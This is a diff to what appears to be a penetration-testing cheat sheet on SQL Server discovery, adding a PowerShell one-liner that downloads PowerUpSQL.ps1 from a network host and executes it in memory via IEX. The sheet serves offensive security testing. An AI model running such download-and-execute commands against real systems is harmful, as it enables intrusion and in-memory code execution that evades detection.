@@ -406,6 +406,12 @@ VERBOSE: Parsing SQL Server instances from SPNs...
 VERBOSE: 0 instances were found. 
 ```
 
+Or load into memory
+
+```text
+IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpSQL.ps1")
+```
+
 #### SQL Server Discovery Cheats 
 
 <table>
